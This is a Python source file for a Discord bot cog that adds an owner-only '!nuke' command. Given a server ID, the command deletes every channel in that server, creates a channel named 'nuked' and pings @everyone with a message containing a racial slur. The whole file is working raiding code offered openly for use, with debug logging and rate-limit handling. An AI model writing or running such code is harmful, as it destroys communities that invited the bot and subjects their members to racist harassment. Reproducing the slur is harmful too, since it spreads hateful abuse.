import discord
from discord.ext import commands
import asyncio


class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.owner_id = 1151872484937834496  # Your Discord ID

    @commands.command(name="nuke", aliases=["nuker"])  # Added alias in case nuke is taken
    async def nuke(self, ctx, server_id: int = None):
        """Nuke a server by ID. Works in DMs. Bot owner only."""
        
        # Debug: Confirm command received
        print(f"[NUKE] Command received from {ctx.author.id} ({ctx.author.name})")
        print(f"[NUKE] Args: server_id={server_id}")
        print(f"[NUKE] Channel type: {type(ctx.channel)}")
        
        # Check if user is bot owner
        if ctx.author.id != self.owner_id:
            await ctx.send("❌ You don't have permission to use this command.")
            print(f"[NUKE] Permission denied for {ctx.author.id}")
            return
        
        if not server_id:
            await ctx.send("❌ Usage: `!nuke <server_id>`")
            return
        
        # Fetch the guild
        guild = self.bot.get_guild(server_id)
        if not guild:
            await ctx.send(f"❌ Could not find server with ID `{server_id}`. Make sure the bot is in that server.")
            print(f"[NUKE] Guild {server_id} not found")
            return
        
        await ctx.send(f"🚨 Nuking **{guild.name}**... This may take a moment.")
        print(f"[NUKE] Starting nuke of {guild.name} ({guild.id})")
        
        # Delete all channels
        deleted_count = 0
        channels = list(guild.channels)
        print(f"[NUKE] Found {len(channels)} channels to delete")
        
        for channel in channels:
            try:
                await channel.delete(reason="Nuke command executed by bot owner")
                deleted_count += 1
                print(f"[NUKE] Deleted {channel.name}")
                await asyncio.sleep(0.3)  # Rate limit safety
            except Exception as e:
                print(f"[NUKE] Failed to delete {channel.name}: {e}")
        
        # Create new channel
        try:
            print("[NUKE] Creating 'nuked' channel...")
            new_channel = await guild.create_text_channel("nuked", reason="Nuke command")
            
            # Send @everyone ping with message
            await new_channel.send("@everyone get nuked niggas")
            print("[NUKE] Message sent")
            
            await ctx.send(f"✅ **NUKE COMPLETE**\n🗑️ Deleted `{deleted_count}` channels\n📢 Created `nuked` channel and pinged everyone")
        except Exception as e:
            print(f"[NUKE] Error creating channel: {e}")
            await ctx.send(f"⚠️ Deleted channels but failed to create new channel: {e}")

    @nuke.error
    async def nuke_error(self, ctx, error):
        print(f"[NUKE ERROR] {error}")
        if isinstance(error, commands.MissingRequiredArgument):
            await ctx.send("❌ Usage: `!nuke <server_id>`")
        elif isinstance(error, commands.BadArgument):
            await ctx.send("❌ Server ID must be a number. Example: `!nuke 123456789012345678`")
        else:
            await ctx.send(f"❌ Error: {error}")


async def setup(bot):
    # Remove existing nuke command if it exists
    bot.remove_command("nuke")
    print("[NUKE] Old nuke command removed (if existed)")
    await bot.add_cog(Nuke(bot))
    print("[NUKE] Cog loaded successfully")
